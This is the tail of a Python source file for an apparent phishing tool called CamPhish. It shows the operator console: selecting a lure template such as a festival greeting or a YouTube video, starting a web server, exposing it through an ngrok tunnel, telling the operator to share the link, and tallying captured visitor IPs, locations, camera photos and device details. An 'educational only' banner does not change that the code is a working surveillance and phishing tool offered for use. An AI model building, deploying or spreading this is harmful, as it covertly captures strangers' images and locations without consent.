    ╚══════════════════════════════════════════════════════════╝\033[0m

\033[91m    ⚠️  FOR EDUCATIONAL AND SECURITY TESTING ONLY ⚠️\033[0m

\033[97m    System: {platform.system()} {platform.release()}
    Python: {sys.version.split()[0]}\033[0m
        """)
    
    def setup(self):
        """Setup directories"""
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        os.makedirs(TEMP_DIR, exist_ok=True)
    
    def select_template(self):
        """Select template"""
        global current_template, template_config
        
        print("\n\033[94mAvailable Templates:\033[0m\n")
        for key, template in TEMPLATES.items():
            print(f"  \033[92m[{key}]\033[0m {template['name']}")
            print(f"      └─ {template['desc']}\n")
        
        while True:
            choice = input("\033[93m[?]\033[0m Select template (1-3): ").strip()
            
            if choice in TEMPLATES:
                current_template = choice
                print(f"\n\033[92m[+]\033[0m Selected: {TEMPLATES[choice]['name']}")
                
                if choice == '1':
                    festival = input("\033[93m[?]\033[0m Festival name [Festival]: ").strip() or "Festival"
                    template_config = {'festival': festival}
                elif choice == '2':
                    video_id = input("\033[93m[?]\033[0m YouTube Video ID [dQw4w9WgXcQ]: ").strip() or "dQw4w9WgXcQ"
                    template_config = {'video_id': video_id}
                
                return True
            
            print("\033[91m[!]\033[0m Invalid choice")
    
    def select_tunnel(self):
        """Select tunnel method"""
        print("\n\033[94mTunnel Options:\033[0m\n")
        print("  \033[92m[1]\033[0m Ngrok (public)")
        print("  \033[92m[2]\033[0m Local (local network only)")
        print()
        
        while True:
            choice = input("\033[93m[?]\033[0m Select tunnel (1-2): ").strip()
            
            if choice == '1':
                return self.tunnel.start_ngrok(PORT)
            elif choice == '2':
                return self.tunnel.start_local(PORT)
            else:
                print("\033[91m[!]\033[0m Invalid choice")
    
    def start_server(self):
        """Start HTTP server"""
        global httpd
        
        handler = CamPhishHandler
        try:
            httpd = socketserver.TCPServer(("0.0.0.0", PORT), handler)
            thread = threading.Thread(target=httpd.serve_forever)
            thread.daemon = True
            thread.start()
            
            print(f"\n\033[92m[+]\033[0m Server started on port {PORT}")
            return True
            
        except Exception as e:
            print(f"\033[91m[!]\033[0m Failed to start server: {e}")
            return False
    
    def monitor(self, url):
        """Monitor captures"""
        print("\n" + "="*60)
        print(" \033[92mSESSION ACTIVE\033[0m ".center(60, "="))
        print("="*60)
        
        if url:
            print(f"\n\033[93m📢 Share this link:\033[0m {url}")
        
        print("\n\033[90mPress Ctrl+C to stop\033[0m\n")
        
        last_counts = {'ips': 0, 'locations': 0, 'photos': 0}
        start_time = time.time()
        
        while self.running:
            elapsed = int(time.time() - start_time)
            current = {
                'ips': len(captured_data.get('ips', [])),
                'locations': len(captured_data.get('locations', [])),
                'photos': len(captured_data.get('photos', []))
            }
            
            status = (f"\r\033[94m⏱️ {elapsed//60:02d}:{elapsed%60:02d} "
                     f"| 👤 Visitors: {current['ips']} "
                     f"| 📍 Locations: {current['locations']} "
                     f"| 📸 Photos: {current['photos']}\033[0m")
            
            print(status, end='', flush=True)
            
            # Check for new captures
            for key in current:
                if current[key] > last_counts[key]:
                    print(f"\n\033[92m[+]\033[0m New {key} captured!")
                    last_counts[key] = current[key]
            
            time.sleep(1)
    
    def summary(self):
        """Show session summary"""
        print("\n\n" + "="*60)
        print(" \033[94mSESSION SUMMARY\033[0m ".center(60, "="))
        print("="*60 + "\n")
        
        print(f"\033[97mVisitors:\033[0m {len(captured_data.get('ips', []))}")
        print(f"\033[97mLocations:\033[0m {len(captured_data.get('locations', []))}")
        print(f"\033[97mPhotos:\033[0m {len(captured_data.get('photos', []))}")
        print(f"\033[97mDevices:\033[0m {len(captured_data.get('device_info', []))}")
        
        # Save summary
        summary = {
            'timestamp': datetime.now().isoformat(),
            'template': current_template,
            'stats': {
                'visitors': len(captured_data.get('ips', [])),
                'locations': len(captured_data.get('locations', [])),
                'photos': len(captured_data.get('photos', []))
            }
        }
        
        with open(f"{OUTPUT_DIR}/summary.json", 'w') as f:
            json.dump(summary, f, indent=2)
        
        print(f"\n\033[92m[+]\033[0m Data saved in: {OUTPUT_DIR}/")
    
    def cleanup(self):
        """Cleanup resources"""
        print("\n\033[93m[*]\033[0m Cleaning up...")
        
        if httpd:
            httpd.shutdown()
        
        self.tunnel.stop()
        
        try:
            shutil.rmtree(TEMP_DIR)
        except:
            pass
        
        print("\033[92m[+]\033[0m Done")
    
    def run(self):
        """Main execution"""
        self.show_banner()
        
        # Setup
        self.setup()
        
        # Check dependencies
        print("\n\033[93m[*]\033[0m Checking dependencies...")
        if not self.tunnel.check_dependencies():
            input("\nPress Enter to continue anyway...")
        
        # Select template
        if not self.select_template():
            return
        
        # Start server
        if not self.start_server():
            return
        
        # Start tunnel
        url = self.select_tunnel()
        
        # Monitor
        try:
            self.monitor(url)
        except KeyboardInterrupt:
            pass
        finally:
            self.summary()
            self.cleanup()

# ==================== Entry Point ====================

if __name__ == "__main__":
    app = CamPhishApp()
    app.run()
